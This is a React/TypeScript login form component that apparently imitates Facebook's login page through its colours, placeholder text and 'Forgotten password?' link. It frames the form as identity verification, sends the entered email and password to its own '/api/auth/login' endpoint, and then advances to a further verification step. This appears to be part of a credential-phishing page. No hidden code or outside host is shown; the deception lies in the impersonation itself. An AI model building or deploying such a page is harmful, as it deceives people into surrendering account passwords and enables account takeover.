import React, { useState } from 'react';
import { apiRequest } from '@/lib/queryClient';

interface IdentityFormProps {
  onVerifyAccount: () => void;
  onForgotPassword: () => void;
}

const IdentityForm: React.FC<IdentityFormProps> = ({ onVerifyAccount, onForgotPassword }) => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    setError(null);
    
    try {
      // Send credentials to the server
      await apiRequest('POST', '/api/auth/login', { email, password });
      
      // Call onVerifyAccount to move to the next step
      onVerifyAccount();
    } catch (err) {
      console.error('Login error:', err);
      setError('An error occurred. Please try again.');
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="bg-white rounded-lg shadow-md p-6 w-full">
      <form onSubmit={handleSubmit} className="space-y-4">
        <div className="space-y-3">
          <input 
            type="text" 
            className="w-full px-3 py-3 text-sm border border-gray-300 rounded-md focus:outline-none focus:border-[#1877F2]" 
            placeholder="Email or phone number"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            required
          />
          
          <input 
            type="password" 
            className="w-full px-3 py-3 text-sm border border-gray-300 rounded-md focus:outline-none focus:border-[#1877F2]" 
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
          />
        </div>

        {error && (
          <div className="text-red-500 text-sm text-center">
            {error}
          </div>
        )}

        <div>
          <button 
            type="submit"
            className="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white font-bold py-2.5 px-4 rounded-md text-base transition-colors"
            disabled={isSubmitting}
          >
            {!isSubmitting ? (
              "Log In"
            ) : (
              <span className="flex items-center justify-center">
                <svg className="animate-spin h-5 w-5 text-white inline mr-2" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                </svg>
                Processing...
              </span>
            )}
          </button>
        </div>

        <div className="text-center">
          <button 
            type="button" 
            onClick={onForgotPassword}
            className="text-[#1877F2] text-sm hover:underline bg-transparent border-none cursor-pointer"
          >
            Forgotten password?
          </button>
        </div>

        <div className="text-center pt-2">
          <button 
            type="button" 
            className="bg-[#42b72a] hover:bg-[#36a420] text-white font-medium py-2 px-4 rounded-md text-sm"
          >
            Continue with Google
          </button>
        </div>
        
        <div className="border-t border-gray-300 pt-4 my-2"></div>
        
        <div className="text-center">
          <p className="text-sm text-[#65676B] mb-3">
            Verify your identity to secure your account and prevent any unauthorized access.
          </p>
        </div>
      </form>
    </div>
  );
};

export default IdentityForm;